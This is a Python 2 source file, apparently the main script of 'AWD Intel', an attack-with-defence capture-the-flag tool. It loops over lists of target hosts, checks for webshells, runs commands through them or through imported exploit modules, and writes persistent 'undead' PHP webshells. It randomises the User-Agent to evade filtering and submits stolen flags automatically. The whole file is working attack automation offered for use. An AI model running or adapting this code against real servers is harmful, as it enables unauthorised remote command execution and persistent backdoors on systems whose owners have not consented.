#!/usr/bin/env python

import traceback
import importlib
from framework.http import http
from framework.config import *
from framework.flag import *
from framework.function import *
import framework.function as function
import os
import sys
import time
from optparse import OptionParser

def test_attack(target,target_port):
	try:
		if 'hell0W0r1d' in vulnerable_attack(target,target_port,test_vul(target,target_port,cmd)):
			return True
	except Exception,e:
		pass
	return False

def attack(target,target_port,cmd,get_flag):

	# status
	global headers,targets_status
	is_vuln = 1
	is_shell = True
	is_alive = 1
	is_flag = 0
	flag = "hello world!"
	info = "success"
	reserve = 0    

	# using random ua for confusing
	if options.random_ua:
		headers['User-Agent'] = random_ua()

	# check shell
	is_shell = check_shell(target,target_port,"")
	if is_shell=='timeout':
		shell_name,shell_arg = shell_hash(target,target_port)
		# Sometime the timeout is result from we are generating an undead webshell
		if shell_name in cmd and shell_type==2 and check_shell(target,target_port,"")!='hell0W0r1d':
			dump_warning("Writting undead php webshell")
			res = "don't panic: timeout due to write undead webshell"
		else:
			dump_error("connect timeout",target+":"+str(target_port),"function.py check_shell")
			write_specific_log(target,target_port,"[-] connect timeout")
			is_alive = 0
			res = "timeout"
	elif is_shell:
		dump_success("check_shell success",target+":"+str(target_port),"function.py check_shell")
		write_specific_log(target,target_port,"[+] check shell success")
		res = execute_shell(target,target_port,cmd)
	else:
		dump_warning("check_shell failed",target+":"+str(target_port),"function.py check_shell")
		write_specific_log(target,target_port,"[-] check shell fail")
		# Here we use the vulnerability we found in the source code
		res = vulnerable_attack(target,target_port,cmd)

	# filter the res
	debug_print(res)
	res = res_filter(res)

	# flag handle
	if get_flag:
		if check_flag(res):
			flag = res
			is_flag = 1
			dump_info("flag => " + res.replace(" ","").replace("\n",""))
		else:
			#is_vuln = 0
			dump_warning("flag format error,you may need to rewrite the shell", target+":"+str(target_port) ,"run.py attack")
			write_specific_log(target,target_port,"[-] flag format wrong")
	if "error happen" in res:
		dump_warning("execution cmd failed",target+":"+str(target_port),"run.py")
		is_vuln = 0
		is_flag = 0
		write_specific_log(target,target_port,"[-] execute cmd fail")
	else:
		dump_success("execution cmd",target+":"+str(target_port),"run.py")
		write_specific_log(target,target_port,"[+] execute cmd success")
	dump_context(res)
	
	# display the status for a target
	now_status =  (target + ":" + target_port).ljust(32," ")
	if is_alive:
		now_status += "|alive|"
		if is_vuln:
			now_status += "|vuln|"
		if is_shell:
			now_status += "|shell|"
		if is_flag:
			now_status += "|flag|"
	else:
		now_status += '|timeout|'
	now_status += '\n'
	targets_status += now_status 
	return flag,is_vuln,info,reserve 

def run():
	global raw_cmd,cmd,first_run
	cmd_split_prefix = "/bin/echo %s;"%cmd_prefix
	cmd_split_postfix = ";/bin/echo %s"%cmd_postfix
	
	# if the target list exsists, load it. or regard it as ip addr
	if udf_target:
		targets = udf_target.split(',')
	elif os.path.isfile(target_list):
		targets = open(target_list).readlines()

	for target in targets:
		target = target.strip('\n')
		target,target_port = target.split(":")
		reserve = 0
		is_vuln = 1
		info = "error"
		flag = "hello world!"

		try:
			# Save the raw cmd
			if first_run:
				raw_cmd = cmd
				first_run = 0
			dump_success("start attack %s with %s "%(target+":"+target_port,raw_cmd))
			# Use the func in function.py to translate the cmd to real cmd
			if func:
				cmd = cmd_split_prefix + func(target,target_port,"") + cmd_split_postfix
			else:
				cmd = cmd_split_prefix + raw_cmd + cmd_split_postfix
			debug_print(cmd)
			flag,is_vuln,info,reserve = attack(target,target_port,cmd,run_for_flag)
			
			# Try to visit the undead shell after it generates
			if shell_type == 2 and raw_cmd == 'get_shell':
				dump_info("Visting the undead shell...")
				visit_shell(target,target_port,'')

		except Exception,e:
			debug_print(traceback.format_exc())
			dump_error(str(e),target,"run.py")
		
		#set the return value reverse => 0 and is_vuln => 1 and the flag has  been changed, post the flag.
		if not reserve and  is_vuln and flag!="hello world!":
			res = post_flag(flag,target,'old_api')
			if res:
				dump_success("get flag success",target+":"+str(target_port),"run.py")
				write_specific_log(target,target_port,"[+] get flag success")
			else:
				# flag server check error may result from the duplicate submission of the flag 
				dump_warning("flag server check error",target+":"+str(target_port),"run.py")
				write_specific_log(target,target_port,"[-] flag server check error")
		elif is_vuln == 0:
			dump_error("server is not vulnerable",target+":"+str(target_port),"run.py")
			write_specific_log(target,target_port,"[-] server is not vulnerable to current payload")
		elif reserve==1:
			dump_error("reverse flag has been set",target+":"+str(target_port),"run.py")
			write_specific_log(target,target_port,"[-] reverse flag has been set")
		dump_success("finish attack %s with %s"%(target+":"+target_port,raw_cmd))
		print ""
		print ""
		print ""
				 
def banner():
	my_banner = ""
	my_banner += "    ___        ______    ___       _       _ \n"
	my_banner += "   / \ \      / /  _ \  |_ _|_ __ | |_ ___| |\n"
	my_banner += "  / _ \ \ /\ / /| | | |  | || '_ \| __/ _ \ |\n"
	my_banner += " / ___ \ V  V / | |_| |  | || | | | ||  __/ |\n"
	my_banner += "/_/   \_\_/\_/  |____/  |___|_| |_|\__\___|_|\n"
	my_banner += "                                             \n"
	my_banner += "                          Hence Zhang@Lancet \n"
	my_banner += "                                             \n"
	print my_banner


if __name__ == '__main__':
	
	# print banner
	banner()

	# parse options
	parser = OptionParser()
	parser.add_option("-m", "--module",\
					 dest="module", default="sample",\
					  help="Input the attack module here :)")
	
	parser.add_option("-c", "--command",\
					 dest="command", default="get_flag",\
					  help="The command you want to run")
	
	parser.add_option("-r", "--random_ua",\
					 dest="random_ua", default="False",\
					  help="Enable the random UA to avoid filter")
	parser.add_option("-l", "--loop",\
					 dest="loop_count", default="65535",\
					  help="To set the loop count for this program")
	parser.add_option("-t", "--udf_target",\
					 dest="udf_target", default="",\
					  help="To set the target for attacking, split with ,")
	parser.add_option("-x", "--thread",\
					 dest="thread", default="1",\
					  help="To set thread number for attacking")
	(options, args) = parser.parse_args()


	dump_info("Start the AWD Intel to hack the planet :)")
	load_script = options.module
	cmd = options.command
	loop_count = int(options.loop_count)
	udf_target = options.udf_target
	if options.random_ua:
		dump_info("enable feature random user-agent")
	if cmd=="get_flag" or cmd=="get_flag_2":
		run_for_flag = 1
	vulnerable_attack = importlib.import_module('samples.' + load_script).vulnerable_attack

# if the attack fails, the possible reasons are:
# 1. the server has fixed up that vuln, then add that server to the fail_list
# 2. the server is down, but not fixed, do not add, just skip it this time.
# 3. some other exceptions, just print it out 

	if hasattr(function,cmd):
		func = getattr(function,cmd)
	else:
		func = None

	while loop_count > 0:
		try:
			run()
			record_status(targets_status)
			targets_status = ''
			dump_info("sleeping ...")
			time.sleep(script_runtime_span)
		except  KeyboardInterrupt:
			dump_error("Program stoped by user, existing...")
			exit()
		dump_info("---------------------------- one round finish -----------------------------")
		print ""
		loop_count -= 1
	dump_info("finish all tasks, have a nice day :)")
